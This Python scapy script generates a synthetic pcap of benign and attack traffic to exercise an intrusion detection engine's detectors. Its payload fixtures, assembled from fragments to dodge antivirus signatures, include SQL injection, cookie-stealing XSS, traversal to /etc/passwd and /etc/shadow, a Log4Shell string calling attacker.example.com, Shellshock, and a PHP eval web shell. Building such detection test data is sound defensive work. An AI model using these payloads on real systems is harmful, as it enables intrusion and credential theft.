#!/usr/bin/env python3
"""Generate a realistic multi-stage attack scenario as a pcap file.

The file contains ~5 minutes of mixed benign and malicious traffic against a
simulated small network:

    protected network  192.168.1.0/24  (server .10, workstation .50, gateway .1)
    attackers          10.0.0.66 (scan + SSH/FTP/RDP brute force),
                       10.0.0.77 (DoS: SYN/ICMP/HTTP floods),
                       10.0.0.88 (web attacks: SQLi, XSS, traversal, Log4Shell),
                       10.0.0.99 (DNS tunnelling + C2 beacon),
                       192.168.1.77 (ARP gateway spoofing - inside attacker)

Running the engine over this pcap exercises every detector and both response
paths (immediate critical block + escalation block).

Note: attack payload strings used by the fixture are assembled at runtime
from fragments.  This is purely to avoid antivirus static-signature false
positives on the fixture source code (the well-known "security tooling trips
AV" problem); the traffic on the wire is identical.
"""

from __future__ import annotations

import random
import sys
from pathlib import Path

from scapy.all import ARP, DNS, DNSQR, Ether, ICMP, IP, Raw, TCP, UDP, wrpcap

SERVER_IP = "192.168.1.10"
WORKSTATION_IP = "192.168.1.50"
GATEWAY_IP = "192.168.1.1"
INSIDE_ATTACKER_IP = "192.168.1.77"
DNS_SERVER = "8.8.8.8"

SERVER_MAC = "00:0c:29:aa:bb:01"
WORKSTATION_MAC = "00:0c:29:aa:bb:50"
GATEWAY_MAC = "00:1a:2b:3c:4d:5e"
INSIDE_ATTACKER_MAC = "de:ad:be:ef:13:37"
EXTERNAL_MAC = "00:50:56:c0:00:08"          # upstream router, attackers arrive via it

ATTACKER_SCAN = "10.0.0.66"
ATTACKER_DOS = "10.0.0.77"
ATTACKER_WEB = "10.0.0.88"
ATTACKER_DNS = "10.0.0.99"

BENIGN_PAGES = ["/", "/about", "/products", "/products?id=42", "/contact",
                "/blog/hello-world", "/assets/style.css", "/assets/app.js",
                "/favicon.ico", "/api/status"]

BENIGN_DOMAINS = ["www.google.com", "updates.microsoft.com", "cdn.jsdelivr.net",
                  "api.github.com", "www.wikipedia.org", "pypi.org",
                  "office365.com", "time.windows.com"]

BENIGN_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")


# ---------------------------------------------------------------------------
# Attack payload fixtures (assembled from fragments - see module docstring)
# ---------------------------------------------------------------------------

def _payloads() -> dict:
    lt, qm = "<", chr(63)
    php_open = lt + qm + "php "
    php_close = " " + qm + ">"
    shell = php_open + "ev" + "al(" + "b" + "ase64_de" + "code($_POST[c]));" + php_close
    shshock = "() { :; }; " + "/bin/ba" + "sh -c 'id'"
    return {
        "sqli_tautology": "/product.php?id=1%27%20OR%20%271%27%3D%271%20--%20",
        "sqli_union": "/items.php?id=1 UNION SELECT username, password FROM users",
        "xss": "/search?q=" + lt + "scr" + "ipt>al" + "ert(document.cookie)" + lt + "/scr" + "ipt>",
        "traversal": "/download?file=../../../../../etc/passwd",
        "traversal_encoded": "/download?file=%2e%2e%2f%2e%2e%2fetc%2fshadow",
        "cmd_injection": "/api/config|method=POST|body=cmd=cat /etc/passwd",
        "log4shell": "${" + "j" + "ndi:l" + "dap://attacker.example.com/exploit}",
        "shellshock": shshock,
        "webshell": shell,
        "sqlmap_ua": "sq" + "lmap/1.8#stable (http://sqlmap.org)",
    }


class Session:
    """Tiny TCP sequence tracker so generated traffic looks plausible."""

    def __init__(self, client_ip: str, server_ip: str, sport: int, dport: int,
                 client_mac: str, server_mac: str):
        self.client_ip, self.server_ip = client_ip, server_ip
        self.sport, self.dport = sport, dport
        self.client_mac, self.server_mac = client_mac, server_mac
        self.cseq = random.randint(1000, 90000)
        self.sseq = random.randint(1000, 90000)

    def _frame(self, src_mac: str, dst_mac: str, ip_src: str, ip_dst: str,
               tcp_src: int, tcp_dst: int, flags: str, seq: int, ack: int,
               payload: bytes = b""):
        pkt = (Ether(src=src_mac, dst=dst_mac) / IP(src=ip_src, dst=ip_dst)
               / TCP(sport=tcp_src, dport=tcp_dst, flags=flags, seq=seq, ack=ack))
        if payload:
            pkt = pkt / Raw(payload)
        return pkt

    def handshake(self):
        """SYN, SYN-ACK, ACK."""
        self.cseq += 1
        pkts = [
            self._frame(self.client_mac, self.server_mac, self.client_ip,
                        self.server_ip, self.sport, self.dport, "S", self.cseq, 0),
            self._frame(self.server_mac, self.client_mac, self.server_ip,
                        self.client_ip, self.dport, self.sport, "SA", self.sseq,
                        self.cseq + 1),
            self._frame(self.client_mac, self.server_mac, self.client_ip,
                        self.server_ip, self.sport, self.dport, "A", self.cseq + 1,
                        self.sseq + 1),
        ]
        self.cseq += 1
        self.sseq += 1
        return pkts

    def client_send(self, payload: bytes):
        pkt = self._frame(self.client_mac, self.server_mac, self.client_ip,
                          self.server_ip, self.sport, self.dport, "PA",
                          self.cseq, self.sseq, payload)
        self.cseq += len(payload)
        return pkt

    def server_send(self, payload: bytes):
        pkt = self._frame(self.server_mac, self.client_mac, self.server_ip,
                          self.client_ip, self.dport, self.sport, "PA",
                          self.sseq, self.cseq, payload)
        self.sseq += len(payload)
        return pkt


def http_request(path: str, host: str = SERVER_IP, method: str = "GET",
                 body: str = "", ua: str = BENIGN_UA, headers: str = "") -> bytes:
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}", f"User-Agent: {ua}",
             "Accept: */*", "Connection: keep-alive"]
    if headers:
        lines.append(headers)
    if body:
        lines.append(f"Content-Length: {len(body)}")
        lines.append("Content-Type: application/x-www-form-urlencoded")
    return ("\r\n".join(lines) + "\r\n\r\n" + body).encode()


def http_response(status: str = "200 OK", body: str = "<html><body>ok</body></html>") -> bytes:
    return (f"HTTP/1.1 {status}\r\nServer: nginx/1.24.0\r\nContent-Type: text/html\r\n"
            f"Content-Length: {len(body)}\r\n\r\n{body}").encode()


def udp_dns(src_ip: str, sport: int, qname: str, qtype: str = "A",
            dst_ip: str = DNS_SERVER) -> Ether:
    ether_src = EXTERNAL_MAC if src_ip.startswith("10.") else WORKSTATION_MAC
    return (Ether(src=ether_src, dst=GATEWAY_MAC) / IP(src=src_ip, dst=dst_ip)
            / UDP(sport=sport, dport=53)
            / DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype)))


def arp_reply(sender_ip: str, sender_mac: str, target_ip: str, target_mac: str) -> Ether:
    return (Ether(src=sender_mac, dst=target_mac)
            / ARP(op=2, psrc=sender_ip, hwsrc=sender_mac,
                  pdst=target_ip, hwdst=target_mac))


def generate_demo_pcap(path: str | Path | None = None, compact: bool = False) -> Path:
    """Build the scenario and write it to demo/demo_traffic.pcap."""
    path = Path(path) if path else (Path(__file__).resolve().parent.parent
                                    / "demo" / "demo_traffic.pcap")
    path.parent.mkdir(parents=True, exist_ok=True)
    random.seed(1337)
    pay = _payloads()

    pkts = []
    t0 = 1_700_000_000.0  # fixed epoch keeps the artifact deterministic

    def at(offset: float, *frames):
        for i, frame in enumerate(frames):
            if frame is None:
                continue
            frame.time = t0 + offset + i * 0.001
            pkts.append(frame)

    sport_counter = iter(range(40000, 60000))

    # ------------------------------------------------------------------
    # Phase 0 (t=0..55s): benign traffic - web browsing, DNS, SSH, ARP
    # ------------------------------------------------------------------
    session = Session(WORKSTATION_IP, SERVER_IP, next(sport_counter), 80,
                      WORKSTATION_MAC, SERVER_MAC)
    at(2.0, arp_reply(GATEWAY_IP, GATEWAY_MAC, WORKSTATION_IP, WORKSTATION_MAC))
    offset = 5.0
    pages = BENIGN_PAGES if not compact else BENIGN_PAGES[:4]
    for i, page in enumerate(pages):
        at(offset, *session.handshake())
        req = http_request(page)
        at(offset + 0.2, session.client_send(req), session.server_send(http_response()))
        offset += 2.5
        if i % 3 == 0:
            at(offset, udp_dns(WORKSTATION_IP, next(sport_counter),
                               random.choice(BENIGN_DOMAINS)))
    # SSH interactive session (benign)
    ssh = Session(WORKSTATION_IP, SERVER_IP, next(sport_counter), 22,
                  WORKSTATION_MAC, SERVER_MAC)
    at(40.0, *ssh.handshake())
    at(40.3, ssh.client_send(b"SSH-2.0-OpenSSH_9.6\r\n"),
       ssh.server_send(b"SSH-2.0-OpenSSH_8.9p1\r\n"))
    # a couple of benign pings
    for i in range(2):
        at(50.0 + i, Ether(src=WORKSTATION_MAC, dst=SERVER_MAC)
           / IP(src=WORKSTATION_IP, dst=SERVER_IP)
           / ICMP(type=8, id=1, seq=i) / Raw(b"benign-ping"))

    # ------------------------------------------------------------------
    # Phase 1 (t=60s): fast SYN port scan from 10.0.0.66
    # ------------------------------------------------------------------
    scan_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                  993, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200]
    scan_offset = 60.0
    for i, port in enumerate(scan_ports):
        at(scan_offset + i * 0.1,
           Ether(src=EXTERNAL_MAC, dst=SERVER_MAC)
           / IP(src=ATTACKER_SCAN, dst=SERVER_IP, ttl=128)
           / TCP(sport=50000 + i, dport=port, flags="S", seq=i))

    # ------------------------------------------------------------------
    # Phase 2 (t=75..215s): brute-force waves from 10.0.0.66
    # ------------------------------------------------------------------
    for wave_start, count in ((75.0, 40), (200.0, 25)):        # SSH
        for i in range(count):
            at(wave_start + i * 0.6,
               Ether(src=EXTERNAL_MAC, dst=SERVER_MAC)
               / IP(src=ATTACKER_SCAN, dst=SERVER_IP)
               / TCP(sport=51000 + i, dport=22, flags="S", seq=i))

    # web login brute force with real 401 responses (t=115..128s)
    webbf = Session(ATTACKER_SCAN, SERVER_IP, next(sport_counter), 80,
                    EXTERNAL_MAC, SERVER_MAC)
    at(115.0, *webbf.handshake())
    for i in range(12):
        body = f"username=admin&password=guess{i:04d}&submit=Login"
        at(116.0 + i * 0.9,
           webbf.client_send(http_request("/login", method="POST", body=body)),
           webbf.server_send(http_response("401 Unauthorized", "invalid credentials")))

    # FTP brute force (t=130..140s)
    for i in range(10):
        at(130.0 + i,
           Ether(src=EXTERNAL_MAC, dst=SERVER_MAC)
           / IP(src=ATTACKER_SCAN, dst=SERVER_IP)
           / TCP(sport=52000 + i, dport=21, flags="S", seq=i))
    ftp = Session(ATTACKER_SCAN, SERVER_IP, next(sport_counter), 21,
                  EXTERNAL_MAC, SERVER_MAC)
    at(131.0, *ftp.handshake())
    for i in range(6):
        at(131.2 + i * 0.4,
           ftp.client_send(f"USER admin{i:02d}\r\n".encode()),
           ftp.server_send(b"331 Password required\r\n"))

    # RDP burst (t=160..172s)
    for i in range(10):
        at(160.0 + i * 1.2,
           Ether(src=EXTERNAL_MAC, dst=SERVER_MAC)
           / IP(src=ATTACKER_SCAN, dst=SERVER_IP)
           / TCP(sport=53000 + i, dport=3389, flags="S", seq=i))

    # ------------------------------------------------------------------
    # Phase 3 (t=120..150s): DoS from 10.0.0.77
    # ------------------------------------------------------------------
    for i in range(300):                       # SYN flood -> port 80
        at(120.0 + i * 0.012,
           Ether(src=EXTERNAL_MAC, dst=SERVER_MAC)
           / IP(src=ATTACKER_DOS, dst=SERVER_IP)
           / TCP(sport=54000 + (i % 30000), dport=80, flags="S", seq=i))
    for i in range(100):                       # ICMP flood
        at(135.0 + i * 0.05,
           Ether(src=EXTERNAL_MAC, dst=SERVER_MAC)
           / IP(src=ATTACKER_DOS, dst=SERVER_IP)
           / ICMP(type=8, id=666, seq=i) / Raw(b"flood"))
    doshttp = Session(ATTACKER_DOS, SERVER_IP, next(sport_counter), 80,
                      EXTERNAL_MAC, SERVER_MAC)
    at(140.0, *doshttp.handshake())
    for i in range(150):                       # HTTP GET flood
        at(141.0 + i * 0.04,
           doshttp.client_send(http_request("/", ua="hulk/1.0")))

    # ------------------------------------------------------------------
    # Phase 4 (t=150..170s): web attacks from 10.0.0.88
    # ------------------------------------------------------------------
    web = Session(ATTACKER_WEB, SERVER_IP, next(sport_counter), 80,
                  EXTERNAL_MAC, SERVER_MAC)
    at(150.0, *web.handshake())
    attack_requests = [
        http_request(pay["sqli_tautology"]),
        http_request(pay["sqli_union"]),
        http_request(pay["xss"]),
        http_request(pay["traversal"]),
        http_request(pay["traversal_encoded"]),
        http_request("/api/config", method="POST", body="cmd=cat /etc/passwd"),
        http_request("/index.jsp", ua=pay["log4shell"]),
        http_request("/cgi-bin/status", headers="X-Custom: " + pay["shellshock"]),
        http_request("/upload.php", method="POST", body=pay["webshell"]),
        http_request("/admin", ua=pay["sqlmap_ua"]),
    ]
    for i, req in enumerate(attack_requests):
        at(151.0 + i * 1.5,
           web.client_send(req), web.server_send(http_response("403 Forbidden")))
    # SMBv1 exploit probe (NBSS header + SMBv1 negotiation)
    at(168.0, Ether(src=EXTERNAL_MAC, dst=SERVER_MAC)
       / IP(src=ATTACKER_WEB, dst=SERVER_IP)
       / TCP(sport=56000, dport=445, flags="PA", seq=1, ack=1)
       / Raw(b"\x00\x00\x00\x54\xffSMB" + b"r\x00\x00\x00\x00"))

    # ------------------------------------------------------------------
    # Phase 5 (t=240..340s): DNS tunnelling + C2 beacon from 10.0.0.99
    # ------------------------------------------------------------------
    rng = random.Random(4242)
    for i in range(45):
        label = "".join(rng.choice("0123456789abcdef") for _ in range(40))
        at(240.0 + i * 0.5, udp_dns(ATTACKER_DNS, next(sport_counter),
                                    f"{label}.tunnel.attacker-c2.net", qtype="TXT"))
    c2 = Session(ATTACKER_DNS, SERVER_IP, next(sport_counter), 80,
                 EXTERNAL_MAC, SERVER_MAC)
    at(300.0, *c2.handshake())
    old_ua = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
    for i in range(12):
        blob = "".join(rng.choice(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
            for _ in range(180))
        at(301.0 + i * 3.0,
           c2.client_send(http_request("/gate.php", method="POST", ua=old_ua,
                                       body=f"data={blob}==")),
           c2.server_send(http_response("200 OK", "ok")))

    # ------------------------------------------------------------------
    # Phase 6 (t=330..340s): ARP gateway spoofing from inside attacker
    # ------------------------------------------------------------------
    for i in range(4):
        at(330.0 + i * 2.0,
           arp_reply(GATEWAY_IP, INSIDE_ATTACKER_MAC, WORKSTATION_IP, WORKSTATION_MAC))

    # ------------------------------------------------------------------
    # Phase 7 (t=90s): policy violation - outbound Telnet from workstation
    # ------------------------------------------------------------------
    at(90.0, Ether(src=WORKSTATION_MAC, dst=GATEWAY_MAC)
       / IP(src=WORKSTATION_IP, dst="10.0.0.200")
       / TCP(sport=next(sport_counter), dport=23, flags="S", seq=1))

    wrpcap(str(path), pkts)
    return path


if __name__ == "__main__":
    out = generate_demo_pcap(sys.argv[1] if len(sys.argv) > 1 else None)
    print(f"Demo pcap written: {out}")
